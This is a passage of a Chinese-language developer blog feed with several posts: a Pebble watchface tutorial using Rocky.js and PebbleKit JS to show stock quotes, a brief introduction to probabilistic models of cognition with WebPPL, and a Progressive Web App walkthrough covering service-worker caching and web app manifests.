這邊你會看到好幾種選項，Pebble C SDK 應該可以算是最主要的開發工具，可以寫 watchface 也可以寫 app，而 Pebble.js 似乎是較為舊版的 javascript SDK，我們今天要介紹的 Rocky.js也還在持續更新中。
選了 Rocky.js 後，就可以開始進行我們今天的開發了！
先給大家看一下開發完成後，從 IDE 上的模擬器看起來會長什麼樣子。


左邊大大秀出時間，右上角顯示星期幾，右下角則是股票資訊。
Something you should know before you start to codePebble watchface 的 js 開發大致上分為兩塊：Rocky JS 與 PebbleKit JS
Rocky JS 負責手錶端的程式，包含 UI 繪製以及與手機端的溝通。
PebbleKit JS 我們先前並沒有提到，他是運行在手機端的程式，會安裝在你手機的 Pebble app 內，主要負責與其他 Web Service 溝通，並將訊息傳給手錶作畫面上的顯示與更新。
基本上兩者都是 Javascript，只是多了 Pebble 提供的 API。
Coding Time!IDE 左邊的列表中有許多選項，我們會先需要新增一個 index.js，按下 ADD NEW button


有三種類型的 javascript 檔案可以選擇，我們先開發 Rocky.js，繪製基本的時間出來。
先 include rocky.js
var rocky = require(&#x27;rocky&#x27;);
RockyJS 的 API 很簡單，主要是一種 Event-based 的感覺，我們可以透過註冊一個 minutechange 的 event 來監聽 分鐘 的變化。
rocky.on(&#x27;minutechange&#x27;, function(event) &#123;  // Request the screen to be redrawn on next pass  rocky.requestDraw();&#125;);

每分鐘我們都呼叫一次 rocky.requestDraw()，透過這個 function 我們可以發出一個 Draw 的 event，而該 event 會帶著一個包含 CanvasRenderingContext2D 物件的參數，根據這個參數我們可以有許多 Canvas 相關的 API 可以使用，來繪製我們想要的畫面。
既然是觸發事件，理所當然就是註冊一個 Listener 來處理。
rocky.on(&#x27;draw&#x27;, function(event) &#123;  var ctx = event.context;  // Clear the screen  ctx.clearRect(0, 0, ctx.canvas.clientWidth, ctx.canvas.clientHeight);  // Determine the width and height of the display  var w = ctx.canvas.unobstructedWidth;  var h = ctx.canvas.unobstructedHeight;  drawAPI.drawDigital(ctx, w * (1/5) + 10, h * (1/5) - 5, &#x27;white&#x27;, &#x27;49px Roboto-subset&#x27; );  drawAPI.drawDay(ctx,  w * (4/5) - 5, h * (1/5) - 15);  // Draw Stock on the bottom of the screen, if available  if (stockData) &#123;    drawAPI.drawStock(ctx, stockData, w * (4/5) - 15, h * (3/5) - 10);  &#125;&#125;);

在這段 Listener 中，我做了幾件事情：

從 event 中將 context 取出來，也就是先前提到的 CanvasRenderingContext2D，並且先透過 clearRect() 將螢幕清乾淨，因為每次被呼叫到的時候，都代表我們要重新繪製畫面。

將螢幕畫布的寬高暫存起來，用於之後繪製其他圖形時計算各自要擺放的座標位置。

呼叫 drawAPI 來繪製需要的內容。drawAPI 是我另外寫的一個 js file，將繪圖邏輯與主要 API 做個分離。在這邊我們一樣能夠透過 require()將我們自己寫的 js 檔案匯入。

最後是當有股票資料存在的時候，繪製股票資訊，這部分稍後講到 PebbleKit.js 的時候會再提到。


主要的邏輯就這麼簡單，註冊 listener，分發 requestDraw 事件，然後重繪畫面！
How to draw?接著就是要發揮你們藝術家天份的時刻了，利用 CanvasRenderingContext2D 提供的介面，我們可以輕易地畫出長方體、圓形、路徑與文字，並且設定顏色與字型大小等等，詳細的 API 參數可以直接參考官網，因為能用的 API 其實不多，所以看起來也很清楚。
CanvasRenderingContext2D API Doc
這邊講解我用到的部分：
drawAPI.drawDigital(ctx, w * (1/5) + 10, h * (1/5) - 5, &#x27;white&#x27;, &#x27;49px Roboto-subset&#x27; );

 drawDigital 是用來繪製畫面上的數位時間，也就是螢幕左邊大大的數字，參數很簡單，就是 context object、x, y 的座標位置、顏色與字型大小。
 這邊有兩點要注意，座標位置跟一般 web 上的標準一樣，螢幕左上角為 (0, 0)，計算每個圖形的位置會是初期開發簡單的 watchface 中較為麻煩的地方，因為畫面很小，你要好好調整才行。
另外一個要小心的是，雖然你看這邊的字型大小寫法，似乎跟一般 CSS 的格式一樣，但你可不能自己隨意亂加大小或是 font-family，需要使用它們定義好的才能生效。可用字型列表-link
實際的 drawDigital function
var hourAndMin = new Date()                .toLocaleTimeString()                .split(&#x27;:&#x27;)                .splice(0,2);var hourText = hourAndMin[0];var minutesText = hourAndMin[1];ctx.fillStyle = color;ctx.textAlign = &#x27;center&#x27;;ctx.font = font;ctx.fillText(hourText, cx, cy - 20, 70);ctx.fillText(minutesText, cx, cy + 35, 70);
透過 ctx 可以設定 fillStyle、textAlign、font style，並使用 fillText() 來將文字繪製在畫面，參數分別是：文字內容, x 座標, y 座標, 最大寬度(option)，若你有設定最大寬度，當你的文字大於這寬度時，會自動使用較小的字體。
繪製星期的部分其實與時間大同小異，直接看程式碼：
var day = &#x27;&#x27;;switch (new Date().getDay()) &#123;  case 0:      day = &quot;SUN&quot;;      break;  case 1:      day = &quot;MON&quot;;      break;  case 2:      day = &quot;TUE&quot;;      break;  case 3:      day = &quot;WED&quot;;      break;  case 4:      day = &quot;THU&quot;;      break;  case 5:      day = &quot;FRI&quot;;      break;  case 6:      day = &quot;SAT&quot;;  &#125;  ctx.fillStyle = &#x27;lightgray&#x27;;  ctx.textAlign = &#x27;center&#x27;;  ctx.font = &#x27;24px bold Gothic&#x27;;  ctx.fillText(day, cx, cy, 30);

當你寫完這些後，你就可以先試著執行看看。
點擊右邊選項中的播放鍵，就會自動編譯並啟動模擬器。若是沒有問題，你會看到模擬器開啟，並出現一條 progress bar 顯示正在安裝，第一次會比較久一點。
成功後就會出現畫面，並有個彈跳視窗出來，這邊可能是翻譯問題，所謂的 解除 其實就只是取消這個彈跳視窗罷了，我一開始還不太敢按，怕他把我的 App 解除安裝 XD


Fetch Stock Data既然是智慧手錶，當然不能只有單純的顯示時間，接下來說明怎麼樣搭配 PebbleKitJS 透過你的手機來獲取 Web 資料，並傳送給手機顯示。
PebbleKit JS 是運行在你手機端的 Pebble app 裡面，一樣也是 Event-based 的方式：
Pebble.on(&#x27;message&#x27;, function(event) &#123;    ...&#125;);
因為是運行在 Pebble 自己的環境下，所以我們這邊不需要 require 什麼 library，直接註冊 message event 的 listener 即可。
手錶端的 RockyJS 可以透過 postMessage() 傳送訊息給 PebbleKit，當 PebbleKit 的 listener 監聽到傳送過來的 message 事件後，就可以採取相對應的措施，像是發送 Ajax 抓取 web 資料，並同樣透過 postMessage() 將資料傳回給手錶端的 RockyJS。
完整的手機端 PebbleKit JS 
// Get the message that was passedvar message = event.data;// we random pick one of these stock symbol to showvar stockSymbols = [&#x27;YHOO&#x27;, &#x27;GOOGL&#x27;, &#x27;AAPL&#x27;];var randStockSymbol = stockSymbols[Math.floor(Math.random() * stockSymbols.length)];if (message.fetch) &#123;// use yql to fetch data (don&#x27;t use in productin or sell)var url = &#x27;https://query.yahooapis.com/v1/public/yql&#x27; +     &#x27;?q=select * from yahoo.finance.quotes where symbol in &#x27; +    &#x27;(&quot;&#x27;+randStockSymbol+&#x27;&quot;)&amp;format=json&amp;env=store://datatables.org/alltableswithkeys&amp;callback=&#x27;;  request(encodeURI(url), &#x27;GET&#x27;, function(respText) &#123;    var stockData = JSON.parse(respText);    Pebble.postMessage(&#123;      &#x27;stockData&#x27;: &#123;        &#x27;symbol&#x27;: stockData.query.results.quote.symbol,        &#x27;Ask&#x27;: stockData.query.results.quote.Ask,        &#x27;Bid&#x27;: stockData.query.results.quote.Bid      &#125;    &#125;);  &#125;);&#125;

註1: 因為不能用 es6 來寫，所以也沒有 fetch 可以用，所以這邊的 request 是自己寫的 XMLHttpRequest function。註2: 記得 encodeURI 一下 url，否則有可能會出現 invalid url error
接著我們回到手錶端的 RockyJS，在原本的程式下加入這兩段：
rocky.on(&#x27;hourchange&#x27;, function(event) &#123;  // Send a message to fetch the weather information (on startup and every hour)  rocky.postMessage(&#123;&#x27;fetch&#x27;: true&#125;);&#125;);rocky.on(&#x27;message&#x27;, function(event) &#123;  // Receive a message from the mobile device (pkjs)  var message = event.data;  if (message.stockData) &#123;    // Save the stockData data    stockData = message.stockData;    // Request a redraw so we see the information    rocky.requestDraw();  &#125;&#125;);

在 hourchange 事件發生時，我們 postMessage() 告訴 PebbleKitJS 需要去抓取新資料，並且註冊 message 的 event listener，當資料傳送回來時，我們重繪製畫面。（這邊直接把資料存在全域變數，方便讀取）
Final Result!Tada~ 股票資訊就出現了！


當然不能一直在模擬器上跑，我們要安裝到手錶上！


點選左邊選項列表的 編製，選擇 PHONE，並安裝執行即可！
記得打開手機上 Pebble app 內的 developer mode


編譯成功的話就可以在手錶上看到畫面，若失敗有問題，可以檢視編譯結果，從 log 中去找問題，像我一開始就忘記 encodeURI，導致 ajax 出問題。


上圖內的 PBW，是可以讓你下載下來，之後要 publish 到 store 的時候所使用的，至於怎麼 publish？這邊再講下去篇幅有點長，會另外寫一篇來介紹。
手錶上看起來長這樣~


本文中介紹的程式碼在此：https://github.com/ArvinH/clean-stock-pebble-wf
若想看官網上指針時鐘與天氣的範例，我也有個修改版本的：https://github.com/ArvinH/pebble-watchface-starterkit
資料來源
Pebble build with JS
Pebble forum

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>pebble</tag>
        <tag>wearable</tag>
        <tag>rocky.js</tag>
        <tag>pebblekit.js</tag>
      </tags>
  </entry>
  <entry>
    <title>初探 Probabilistic Models of Cognition</title>
    <url>/2018/03/24/prob-model-of-cog-1/</url>
    <content><![CDATA[前言最近這幾年，AI 的發展又再次變得蓬勃，是一次很好的機會，讓人們可以打造出極棒的科技來為眾人服務。近年最紅的是深度學習已經有很多相關研究，TB 周刊中也一直會為大家放上一些最新的發展，但是，筆者一直對潛藏在我們心智中的基石很有興趣，而這些基石，就跟今天想要介紹的 Probabilistic Models of Cognition 很有關係。
Probabilistic Models of Cognition 的基本想法如果我們將人的腦袋想成一個 function，這個 function 可以做好多好多的事。例如看到一本好書、遇到一個好老師、聽到一門好課，我們會想要去把握、想要分享；例如我們看到一幅美麗的畫、一個壯麗的景觀，我們會發出讚嘆、想跟自己珍視的人一起欣賞；遇到千千萬萬種不同的 input，我們會有千千萬萬種不同的想法。
雖然我們可以處理千千萬萬種情境，產生千千萬萬種想法，但是，我們處理這千千萬萬種情境時，使用的基石可能很少。例如，我們只要知道：

物體有重量（基石 A）
抓住物體、抵抗重力才能拿起物體（基石 B）
用力拋出物體，物體會飛行（基石 C）就可以丟出數以千計種物體（已簡化，還需要看得到物體位置、能夠操控手..等等條件）。

如果能掌握這些基石，那我們是不是就可以用這些基石來產生行為？利用基石來產生行為，就表示這些基石是 generative 的 model。
但是，這些基石又各自潛藏了一些變數，例如拋出去的力要多大才對？是否沒考慮到空氣阻力？所以裡面有一些我們未完整理解（也就是我們理解這個世界，形成的 model，還不完整），所以加入隨機的成分，這也是 Probabilistic Models of Cognition 名稱的由來。
WebPPL為了用比較正規的程式語言來描述我們心智中的基石（也就是 Probabilistic model），作者推出了一種程式語言，叫做 probabilistic programming for the web （WebPPL）。
我們可以使用這個語言來為世界建立簡單的模型，甚至跑模擬，另外，也可以利用裡面實作的推理功能來做簡單的推理。
我們目前只要知道這樣就好，語法那些的有興趣可以看看 這個網站，基本上是由 Javascript 延伸而來。
Generative model
One view of knowledge is that the mind maintains working models of parts of the world. ‘Model’ in the sense that it captures some of the structure in the world, but not all (and what it captures need not be exactly what is in the world—just useful).

上面這段話是什麼意思呢，我們來看個小小的範例（下面的範例可以在 conditioning 這一章節中看到）：
// makes a floor with evenly spaced bucketsvar bins = function (xmin, xmax, width) &#123;return ((xmax &lt; xmin + width)// floor? &#123;shape: &#x27;rect&#x27;, static: true, dims: [400, 10], x: 175, y: 500&#125;// bins: [&#123;shape: &#x27;rect&#x27;, static: true, dims: [1, 10], x: xmin, y: 490&#125;].concat(bins(xmin + width, xmax, width)))&#125;// add two fixed circlesvar world = [&#123;shape: &#x27;circle&#x27;, static: true, dims: [60], x: 60, y: 200&#125;,&#123;shape: &#x27;circle&#x27;, static: true, dims: [30], x: 300, y: 300&#125;].concat(bins(-1000, 1000, 25))var randomBlock = function () &#123;return &#123;shape: &#x27;circle&#x27;, static: false, dims: [10], x: uniform(0, worldWidth), y: 0&#125;&#125;physics.animate(1000, [randomBlock()].concat(world))

模擬跑起來會長得像這樣：
除了模擬去推得結果，也可以從結果反推出
從上面的兩例中可以看出，我們可以用很簡單的幾行 WebPPL 程式，就讓電腦可以做到自己要用其他程式語言來做，是有點難度的推理（當然，背後也是有物理模擬的黑盒子已經被包起來，所以我們不需要管那邊的細節）。
總結今天我們稍微探討了 Probabilistic Models of Cognition，也玩了裡面的一個模擬功能，有興趣的讀者可以直接去看書裡的更多內容或是作者的論文。
延伸閱讀
Josh Tenenbaum - The cognitive science perspective: Reverse-engineering the mind (CCN 2017)

]]></content>
      <tags>
        <tag>Artificial Intelligence</tag>
      </tags>
  </entry>
  <entry>
    <title>Progressive Web App 會是未來趨勢嗎？</title>
    <url>/2016/07/23/progressive-web-app/</url>
    <content><![CDATA[距離今年 Google I&#x2F;O 2016 轉眼間也過了兩個多月，議程中提及的 Progressive Web App (PWA) 似乎討論不多，我當時隨便掃過 Google Developers 上的資料後的念頭是：“怎麼有點像當年 Firefox OS 上跑 web app的長相？”
其實我覺得是蠻雷同的，差別在於 Progressive Web App 是想能夠直接利用目前的 Browser 來支援其運作。實際上 Mozilla 一樣有在推動相關標準的建立。
這也是我初次接觸 Progressive Web App，因此就照著 Google Developers 上的教學走一遍，並紀錄分享在此。
何謂 Progressive Web App (PWA)先講結論，Progressive Web App 是希望能夠讓 Web application 盡可能的在各種環境（網路環境、手機作業系統等）下都能順暢且不減功能性的運作，並讓你的 Web App 可以：

直接被使用者安裝到桌面
offline 使用
擁有推播功能
開啟時看不到 URL Bar（類 Native app 的使用經驗）
開啟時有 Splash Screen

而要做到這些事情，整個 PWA 的設計要點就會包含以下特性：

Progressive - 漸進增強：在越完善的環境下，能執行更加完整的服務，若環境不許可，能夠優雅降級，運行最基本的功能。

Responsive - 響應式介面：能夠在各種螢幕尺寸下顯示、能夠因應多種輸入方式與設備回饋（震動、音頻等）。

App-like - 類原生程式的操作模式與使用者介面：採用原生平台（Native App）的 Style 與資料更新方式（利用 service worker 存取快取資源）。

Fresh - 持續更新：使用 Service worker API 來自動更新應用程式（無需透過 App store, Google Play 等）。

Safe - 應全面採用 HTTPS 提供最基本的安全防護。

Discoverable - 透過設置 manifest 檔案，一樣能進行 SEO 優化，讓搜尋引擎找得到你的 APP。

Re-engageable - 透過推播，能主動與使用者互動。

Installable - 可安裝：透過 Add To Home 等方式，將 Web App 放在手機桌面，並且能在應用程式中單獨列出與切換，就像一般的 App 一樣，但完全不用透過應用程式商店下載。

Linkable - 透過 URL 可以隨時分享你的 App。


上面是官網所列出的，而紅色是我認為較為重點的特徵，而在這些重點特徵下，最大要點就是 Service worker。有了 Service worker 的幫助，你可以實作出離線可用的 Web App，讓 User 操作起來有更佳的使用體驗。


Service WorkerService worker 是一個運行在瀏覽器背後的腳本，有其自己的生命週期，並獨立於網頁頁面。其特性如下：

Javascript worker，無法直接操作頁面 DOM，但可透過 postMessage 與頁面溝通，讓該頁面自行操作 DOM。

Service worker 可以讓你截取並掌控頁面發出的 network request。(這點很重要！要記住！！)

當 Service worker 不需要被使用時，會進入 Terminated 生命週期，等待下一次的需求進來。因此你在 onfetch 或是 onmessage 的 event handler 中若想要儲存全域變數，必須使用 IndexedDB API 來輔助儲存。

使用 Promise (這對一般開發者來說應該已經不算難事)


待會進行 PWA 實作的時候，我們就會運用到 service worker，透過 intercept 以及 handle network requests 來幫忙處理 Cache 的議題。
今天重點擺在 PWA，Service Worker 的相關介紹可以看這裡：source: html5rocks

看太多文字會想睡覺，所以開始動手做我們的第一個 Progressive Web App 吧！
Progressive Web App為求快速，我們跟著 Google developers 上的範例程式走一遍，才能專注在 PWA 的部分，不用去管其他細節。code 可以在此下載 google developers pwa example，後續步驟會需要這份 code 來做對應比較方便理解。
範例是一個天氣卡，可以顯示所選區域的天氣狀況，大致上會長這樣：


App Shell Architecture當你用瀏覽器打開一個網頁時，通常都需要等該頁面載完需要的 javascript, css 等等檔案後，你才能看到一個完整的頁面，在 SPA 當道的現今更是如此（姑且先不談 server-side render）
但還記得先前提過，Progressive Web App 的目標是想要能夠 讓 Web application 盡可能的在各種環境（網路環境、手機作業系統等）下都能順暢且不減功能性的運作。
因此 PWA 提出了一個 App Shell Architecture
App shell architecture 將應用程式的基礎設施（infrastructure）、UI 與資料做分離，並利用 service worker 將 infra 與 UI 做 Cache，如此一來，當你重複打開 Web App 時，需要遠端載入的就只剩下資料，因為其他部分都已經先快取在本地端了（也可以把部分資料先快取起來）。
由上述說明應該不難看出 app shell 的設計會非常重要，他決定了你的 User 進到你的 App 後的第一印象。所以在設計 App shell architecture 時，有幾個要點必須考量清楚：

當 Web App 開啟時，哪些東西需要立即呈現在螢幕上?

有哪些是重要的 UI components？

此 app shell 是否需要 styles, javascript 等等資源？


以今天的範例來說，我們會預期一開啟 App 時，要能馬上看到最上方的 Header 以及中間至少一張天氣預測卡，因此這兩個元件就會是我們必須設計進 App shell architecture 的 component。
稍稍整理一下，我們的 App shell 將會擁有：

顯示 App 名稱、更新與新增按鈕的 Header Bar

Header 下方放置天氣卡的 Container

天氣卡模板

加入地區天氣時的對話筐

載入狀態的 loader


App shell architecture implementation根據上方列出的需求，身為 web developer 一定很快就會把 HTML、CSS 刻好，甚至將可能需要的 JS 都先準備好，但實際上 Progressive web app 的重點其實在於如何將元件與資料做 cache ，以及 app-like 的顯示模式，因此我們跳過這些跟基礎 web 開發相關的步驟，直接到剛剛下載的範例檔案中，打開 step-04 資料夾，裡面就有了最 default 的元件 layout（index.html, inline.cs），以及資料 fetch 相關的 javascript 檔案（app.js）：


[!NOTICE] 需要將程式碼內的一些相關路徑修改一下才能正常運作喔！
開啟以後正常會看到如下畫面：

會先閃過 loading 圈圈，接著利用 initialWeatherForecast 做第一次資料繪製，這邊是先寫死一個假資料，但實務上應該要根據 user 當下 ip location 去抓取資料並更新。
但不管是假資料與否，重點在於，當處理完第一次資料 fetch 後，要能夠 cache 起來，才能應付 slow connection 或是 offline 的狀況。也就是待會 service-worker 要負責的事情。
此外，此 Wep app的功能中，要讓 user 能夠選擇想要的區域，我們總不能要 user 每次進來都重選，因此要能儲存這部分資訊，實務上可以用 IndexDB 來儲存，Google 推薦的 lib 為 idb，而這邊我們簡單用 LocalStorage API 來處理即可。
相關設定在 app.js 當中：
app.js// Iterate all of the cards and attempt to get the latest forecast data app.updateForecasts = function() &#123;   var keys = Object.keys(app.visibleCards);   keys.forEach(function(key) &#123;     app.getForecast(key);   &#125;); &#125;; // Save list of cities to localStorage, see note below about localStorage. app.saveSelectedCities = function() &#123;   var selectedCities = JSON.stringify(app.selectedCities);   // IMPORTANT: See notes about use of localStorage.   localStorage.selectedCities = selectedCities; &#125;; app.selectedCities = localStorage.selectedCities; if (app.selectedCities) &#123;   app.selectedCities = JSON.parse(app.selectedCities);   app.selectedCities.forEach(function(city) &#123;     app.getForecast(city.key, city.label);   &#125;); &#125; else &#123;   app.updateForecastCard(initialWeatherForecast);   app.selectedCities = [     &#123;key: initialWeatherForecast.key, label: initialWeatherForecast.label&#125;   ];   app.saveSelectedCities(); &#125;
如此一來，你可以新增想要的城市，在當你重新載入時，就會看到剛剛所選的城市依然會出現了。

Use Service Worker to Pre-cache the App Shell前情提要Service worker 的功能只能在 localhost 或是 HTTPS 的環境下，並且目前的瀏覽器有支援的不多，至少要 Chrome 47 以上。不過相信會越來越多瀏覽器加入此支援的。
step 1. 註冊 service worker在我們的 app.js 中，需要先檢查是否有 service worker 存在，若無，則透過 navigator.serviceWorker 去註冊。
app.jsif(&#x27;serviceWorker&#x27; in navigator) &#123;    navigator.serviceWorker             .register(&#x27;/service-worker.js&#x27;)             .then(function() &#123; console.log(&#x27;Service Worker Registered&#x27;); &#125;);  &#125;

當然，我們也要創建好我們的 service-worker.js。 Service worker 的檔案要放在根目錄底下，因為 service worker 的 js scope 是包含其所在之目錄。
step 2. Pre-cache assets當 service worker 被註冊好後，當使用者初次開啟我們的 web app，會觸發一個 install event，而我們可以在這個 event handler 中 cache 住我們需要的 assets。
service-worker.jsself.addEventListener(&#x27;install&#x27;, function(e) &#123;  console.log(&#x27;[ServiceWorker] Install&#x27;);  e.waitUntil(    caches.open(cacheName).then(function(cache) &#123;      console.log(&#x27;[ServiceWorker] Caching App Shell&#x27;);      return cache.addAll(filesToCache);    &#125;)  );&#125;);

其中的 caches 是 Service Worker API 中的 CacheStorage，可以到 MDN 瞭解一下。
此外，chacheName 的設定也是蠻重要的，可以依此來分開你的資料與 App shell 的快取。
當你 caches.open後，裡面的 callback 可以呼叫 cache.addAll() 來將 assets 放入快取，cache.addAll() 接受 URL list，像是這樣的格式：
service-worker.jsvar filesToCache = [    &#x27;/&#x27;,    &#x27;/index.html&#x27;,    &#x27;/scripts/app.js&#x27;,    &#x27;/styles/inline.css&#x27;,    &#x27;/images/clear.png&#x27;,    &#x27;/images/cloudy-scattered-showers.png&#x27;,    &#x27;/images/cloudy.png&#x27;,    &#x27;/images/fog.png&#x27;,    &#x27;/images/ic\_add\_white\_24px.svg&#x27;,    &#x27;/images/ic\_refresh\_white\_24px.svg&#x27;,    &#x27;/images/partly-cloudy.png&#x27;,    &#x27;/images/rain.png&#x27;,    &#x27;/images/scattered-showers.png&#x27;,    &#x27;/images/sleet.png&#x27;,    &#x27;/images/snow.png&#x27;,    &#x27;/images/thunderstorm.png&#x27;,    &#x27;/images/wind.png&#x27;  ];

建議你加入版號來設置你的 cachName，這樣才能確保每次更新都能拿到最新資料。不過要記得將過期的 cache 清空！我們可以在 activate 這個 event 的 handler 來做這件事情。
service-worker.jsself.addEventListener(&#x27;activate&#x27;, function(e) &#123;    console.log(&#x27;[ServiceWorker] Activate&#x27;);    e.waitUntil(      caches.keys().then(function(keyList) &#123;        return Promise.all(keyList.map(function(key) &#123;          console.log(&#x27;[ServiceWorker] Removing old cache&#x27;, key);          if (key !== cacheName) &#123;            return caches.delete(key);          &#125;        &#125;));      &#125;)    );  &#125;);

step 3. Fetch assets from cache or not到目前為止，我們知道了怎麼把 assets 存進 cache 裡面，但要怎麼拿出來呢？我們註冊一個 fetch event handler，用來擷取 web app 發出的 request，當 request 有 match 到我們剛剛存入的那些 assets 時，我們就從中取出並回傳，若並沒有 match 到，則利用 fetch api 去真的打 request。 [ fetch api 也是目前實驗中的 web api，介紹可看 Fetch api ]
service-worker.jsself.addEventListener(&#x27;fetch&#x27;, function(e) &#123;    console.log(&#x27;[ServiceWorker] Fetch&#x27;, e.request.url);    e.respondWith(      caches.match(e.request).then(function(response) &#123;        return response || fetch(e.request);      &#125;)    );  &#125;);

Beware of the edge cases目前範例中的 code 實際上並不適合運用在 production 上頭，因為有許多 edge cases 沒有被考慮與處理到：

剛剛提過的，當你的 content 有變動時，cache key 要更新（範例內我們需要手動更新）。
只要你的檔案有一點點更動，小至 typo，大至 code refactor，都會造成 cache invalidated，需要重新下載，效率不好。
必須確保 service-worker 中的 install handler 所發出的 https request 不會被 Brower cache 影響，否則會無法 update。
最重要的一點，範例採用 cache-first 的策略，任何 request 只要有 cache 在就會先拿 cache，若 service worker 相關的註冊與設定也被 cache 時，更新會變得很困難。

Google 提出一套 lib sw-precache 來幫助你避免上述的 edge cases，這超出此篇的範疇，但若要製作 Productoin 版本的 PWA 時，務必研究一下。
此外，在開發中，也可以透過 chrome://serviceworker-internals 來 stop、un-register 現存的 service workers 以及 fresh start service worker。
Test Service worker現在我們可以來試試看剛剛的 service worker 到底能不能幫我們把 assets cache 起來，你可以像 Google 教學中 deploy 到 firebase，也可以學我直接用 express 來 host。
用 express 來 host 範例需要更動幾個地方：

把範例的 index.html, inline.css, app.js 和一些 images 放入 express 中的相對路徑。
修改 service-worker.js 中的 filesToCache 相對路徑，主要是 app.js 與 inline.css

service-worker-in-express.jsvar filesToCache = [  &#x27;/&#x27;,  &#x27;/javascripts/app.js&#x27;,  &#x27;/stylesheets/inline.css&#x27;,  &#x27;...&#x27;,  &#x27;..&#x27;

啟動server 後，開啟 Chrome devTool 的 resources tab，應該可以看到如下畫面，就代表你的 service worker 有成功幫你 cache 住 assets：

step 4. Cache Data接下來我們要 cache 住資料！
策略上分兩種：

cache first then network：一次發兩種 request，先抓 cache 資料，等 network request 回來後更新 cache。
network first then cache：先發 network request，若 timeout 再撈 cache 資料。

這邊我們採用 cache-first，才能因應快速 response 與 offline 使用的需求。
首先我們得在 service-worker 中加入一個 dataCacheName，用以區分資料與 app shell 的 cache。
service-worker.jsvar dataCacheName = &#x27;weatherData-v1&#x27;;

接著在 fetch event handler 中，我們將抓取資料的API request 與其他 request 分開。
service-worker.jsself.addEventListener(&#x27;fetch&#x27;, function(e) &#123;    console.log(&#x27;[ServiceWorker] Fetch&#x27;, e.request.url);    var dataUrl = &#x27;https://publicdata-weather.firebaseio.com/&#x27;;    if (e.request.url.indexOf(dataUrl) === 0) &#123;      // Put data handler code here    &#125; else &#123;      e.respondWith(        caches.match(e.request).then(function(response) &#123;          return response || fetch(e.request);        &#125;)      );    &#125;  &#125;);
上面的 code 中，service-worker 會擷取頁面發出的 request，如果包含 dataUrl，我們就另外處理：
e.respondWith(    fetch(e.request)      .then(function(response) &#123;        return caches.open(dataCacheName).then(function(cache) &#123;          cache.put(e.request.url, response.clone());          console.log(&#x27;[ServiceWorker] Fetched&amp;Cached Data&#x27;);          return response;        &#125;);      &#125;)  );

利用 fetch API 發送 request，送回來的 response 再傳回去之前，會先 clone 一份到 cache 當中。
到這邊為止我們 cache 住資料了，但還是不能 offline 運作！因為還少了一個步驟，先前提到我們要同步發送 兩個 request，一個抓 cache，一個真的送資料。
在 app.js 中的 app.getForecast裡加入這段：
app.jsif (&#x27;caches&#x27; in window) &#123;  caches.match(url).then(function(response) &#123;    if (response) &#123;      response.json().then(function(json) &#123;        // Only update if the XHR is still pending, otherwise the XHR        // has already returned and provided the latest data.        if (app.hasRequestPending) &#123;          console.log(&#x27;[App] Forecast Updated From Cache&#x27;);          json.key = key;          json.label = label;          app.updateForecastCard(json);        &#125;      &#125;);    &#125;  &#125;);&#125;

先檢查 window 有無支援 caches object，接著從 caches 中拿出資料，這時要確認一下同時發送出去的 network request 是否已經 response 回來了，我們這邊用個 flag app.hasRequestPending 來控制。只有在 network response 還沒回來前我們會使用 caches 內的資料。
而在發送原本的 XMLHttpRequest 之前，記得加上 app.hasRequestPending = true;，並在 app.updateForecastCard(response)之前，將 app.hasRequestPending 設為 false。
Test Offline function到目前為止我們的 Web app 已經可以在 offline 使用了，即便遠端 host 掛掉，我們能從 cache 中抓到我們的 App Shell，並且透過 service worker 幫我們去跟 https://publicdata-weather.firebaseio.com/ 要資料；若是連網路都沒有，至少會有 cache 的資料可以顯示！


Support Native IntegrationProgressive Web App 的最後一哩路，我們要加入 Add-to-Homescreen。
要有 Add to Homescreen 的功能不難，只要加入一個 manifest.json 即可，透過這方式打開的 Web App 不會顯示出 URL bar，看起來就像一般的 App！你也可以再加入 Web app install banners，這邊就不討論，可以看這篇的教學 - Web app install banners
Web App Manifest透過 web app manifest，你可以：

像 App 一般有個漂亮 icon 顯現在 Android 的 Homescreen 上。

開啟時可以進入全螢幕畫面，不顯示 URL bar！

控制 screen orientation。

設定 splash screen，以前是為了降低 User 等待載入時間，但現在通常都用來宣傳你的網站品牌等等（有些人是不推薦使用…）

追蹤你的 App 是從 homescreen 還是 url 開啟。


manifets.json&#123;  &quot;name&quot;: &quot;Weather&quot;,  &quot;short_name&quot;: &quot;Weather&quot;,  &quot;icons&quot;: [&#123;    &quot;src&quot;: &quot;images/icons/icon-128x128.png&quot;,      &quot;sizes&quot;: &quot;128x128&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/icons/icon-144x144.png&quot;,      &quot;sizes&quot;: &quot;144x144&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/icons/icon-152x152.png&quot;,      &quot;sizes&quot;: &quot;152x152&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/touch/icon-192x192.png&quot;,      &quot;sizes&quot;: &quot;192x192&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;, &#123;      &quot;src&quot;: &quot;images/touch/icon-256x256.png&quot;,      &quot;sizes&quot;: &quot;256x256&quot;,      &quot;type&quot;: &quot;image/png&quot;    &#125;],  &quot;start_url&quot;: &quot;/&quot;,  &quot;display&quot;: &quot;standalone&quot;,  &quot;background_color&quot;: &quot;#3E4EB8&quot;,  &quot;theme_color&quot;: &quot;#2F3BA2&quot;&#125;
[小技巧] 可以透過在 start_url 設置 query string 的參數來追蹤開啟來源。
manifest 檔案設定好後記得回到你的 index.html 的 &lt;head&gt; 加上 &lt;link rel=&quot;manifest&quot; href=&quot;/manifest.json&quot;&gt;
for safari in ios如果要用在 ios 上的 safari 還需要額外設定
&lt;!-- Add to home screen for Safari on iOS --&gt;&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-status-bar-style&quot; content=&quot;black&quot;&gt;&lt;meta name=&quot;apple-mobile-web-app-title&quot; content=&quot;Weather App&quot;&gt;&lt;link rel=&quot;apple-touch-icon&quot; href=&quot;images/icons/icon-152x152.png&quot;&gt;

Best practices
在你網站的每個 page 都可放入 manifest.json，這樣不管 user 是從哪頁進去，Chrome都能偵測到
short_name 盡量都要設置，優先權高於 name 這個 field。
icon 的大小要盡可能符合多種 device。
icon 也要考量到是否符合 slash screen，並記得設置 background_color

Final最終到你手機上的呈現就會像這樣：
IOS 版本 (ISO 版本看不到 splash screen，不確定原因，可能版本不支援）：

